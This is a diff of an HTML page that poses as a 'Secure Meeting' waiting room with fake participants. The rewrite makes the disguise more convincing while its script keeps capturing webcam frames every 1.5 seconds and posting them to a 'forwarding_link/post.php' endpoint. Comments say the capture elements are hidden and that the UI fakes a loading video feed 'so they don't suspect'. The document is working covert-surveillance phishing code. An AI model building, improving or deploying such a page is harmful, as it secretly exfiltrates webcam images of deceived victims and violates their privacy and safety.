@@ -1,233 +1,400 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Meeting | Enter Room</title>
+
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+  <!-- Modern Fonts & Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  <style>
+    :root {
+      --bg-dark: #121212;
+      --bg-card: #1E1E1E;
+      --text-primary: #FFFFFF;
+      --text-secondary: #A0A0A0;
+      --accent-color: #0E78F9;
+      --danger-color: #FF443D;
+      --control-bg: rgba(40, 40, 40, 0.9);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-dark);
+      color: var(--text-primary);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* Video Grid */
+    .meeting-grid {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .participant-card {
+      background-color: var(--bg-card);
+      border-radius: 12px;
+      width: 100%;
+      max-width: 600px;
+      aspect-ratio: 16/9;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s ease;
+    }
+
+    /* Simulating the user's video feed being "loading" or "off" in UI so they don't suspect */
+    .participant-avatar {
+      width: 80px;
+      height: 80px;
+      background-color: #333;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 2rem;
+      color: #fff;
+    }
+
+    .participant-name {
+      position: absolute;
+      bottom: 15px;
+      left: 15px;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 4px 12px;
+      border-radius: 4px;
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    .mic-status {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: rgba(0, 0, 0, 0.6);
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+    }
+
+    /* Floating Info Tile */
+    .info-tile {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .record-indicator {
+      width: 10px;
+      height: 10px;
+      background-color: red;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.5;
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    /* Bottom Control Bar */
+    .control-bar {
+      height: 80px;
+      background-color: var(--bg-dark);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      padding: 0 20px;
+      z-index: 100;
+    }
+
+    .btn-control {
+      background: var(--bg-card);
+      border: none;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      /* Circle buttons */
+      color: var(--text-primary);
+      font-size: 1.2rem;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: background 0.2s;
+      position: relative;
+    }
+
+    .btn-control:hover {
+      background: #333;
+    }
+
+    .btn-control.active {
+      background-color: var(--accent-color);
+      border-radius: 12px;
+      /* Slight shape change for active state in modern UI */
+      width: auto;
+      padding: 0 20px;
+      height: 40px;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      gap: 8px;
+    }
+
+    .btn-danger {
+      background-color: var(--danger-color);
+      width: auto;
+      padding: 0 24px;
+      border-radius: 25px;
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+
+    .btn-danger:hover {
+      background-color: #d93630;
+    }
+
+    .btn-label {
+      font-size: 0.75rem;
+      margin-top: 4px;
+      color: var(--text-secondary);
+      display: none;
+    }
+
+    /* Label under buttons style alternative */
+    .control-group {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Modal / Popup */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(5px);
+      z-index: 1000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background: var(--bg-card);
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      border: 1px solid #333;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .spinner {
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      border-left-color: var(--accent-color);
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .modal-title {
+      font-size: 1.25rem;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+
+    .modal-text {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+  </style>
 </head>
 
-<div class="video-wrap">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
-
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
-
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
-
-<script>
-
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream;
-
-    var context = canvas.getContext('2d');
-    setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-      video.play();
-    }, 1500);
-
-
-  }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
-  // Load init
-  init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
-</script>
-
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+
+  <!-- Meeting Info -->
+  <div class="info-tile">
+    <div class="record-indicator"></div>
+    <span>Weekly Team Sync</span>
+    <span style="color: #666">|</span>
+    <span style="font-weight: 600">00:12:45</span>
   </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
+
+  <div class="meeting-grid">
+    <!-- Main 'Your Update' Placeholder (Visual only, actual video is hidden) -->
+    <div class="participant-card" style="border: 2px solid var(--accent-color)">
+      <div class="participant-avatar" style="background: transparent">
+        <!-- Using a generic user icon logic or just empty -->
+        <i class="fas fa-spinner fa-spin" style="font-size: 2rem; color: var(--accent-color)"></i>
+      </div>
+      <div class="participant-name">You (Connecting...)</div>
+      <div class="mic-status"><i class="fas fa-microphone-slash"></i></div>
     </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
+
+    <!-- Fake Participants -->
+    <div class="participant-card">
+      <div class="participant-avatar">JD</div>
+      <div class="participant-name">John Doe (Host)</div>
+      <div class="mic-status"><i class="fas fa-microphone"></i></div>
     </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
+    <div class="participant-card">
+      <div class="participant-avatar" style="background-color: #8E44AD">SA</div>
+      <div class="participant-name">Sarah Adams</div>
+      <div class="mic-status"><i class="fas fa-microphone-slash"></i></div>
     </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
   </div>
+
+  <!-- Controls -->
+  <div class="control-bar">
+    <button class="btn-control"><i class="fas fa-microphone"></i></button>
+    <button class="btn-control"><i class="fas fa-video"></i></button>
+    <button class="btn-control active">
+      <i class="fas fa-share-square"></i>
+      <span>Share Screen</span>
+    </button>
+    <button class="btn-control"><i class="fas fa-users"></i></button>
+    <button class="btn-control"><i class="fas fa-comment-alt"></i></button>
+    <button class="btn-control btn-danger">Leave</button>
+  </div>
+
+  <!-- Waiting Room Modal -->
+  <div class="modal-overlay" id="waitingModal">
+    <div class="modal-content">
+      <div class="spinner"></div>
+      <div class="modal-title">Please wait</div>
+      <div class="modal-text">The meeting host will let you in soon.</div>
+    </div>
+  </div>
+
+  <!-- CRITICAL HIDDEN CAPTURE -->
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <center><canvas hidden="hidden" id="canvas" width="640" height="480"></canvas></center>
+
+  <script>
+    // Modal Logic
+    setTimeout(function () {
+      document.getElementById('waitingModal').style.display = "none";
+    }, 5000); // 5 seconds delay to mimic "letting in"
+
+    // Webcam Logic (Preserved)
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) {
+          // call the function that handles the response/results
+        },
+        error: function () {
+        }
+      });
+    };
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    // Error handling element removed from DOM but variable kept for safety if referenced in hidden code
+    // const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        // errorMsgElement.innerHTML = ...
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext('2d');
+      setInterval(function () {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+        video.play();
+      }, 1500);
+    }
+
+    init();
+  </script>
 </body>
 
 </html>
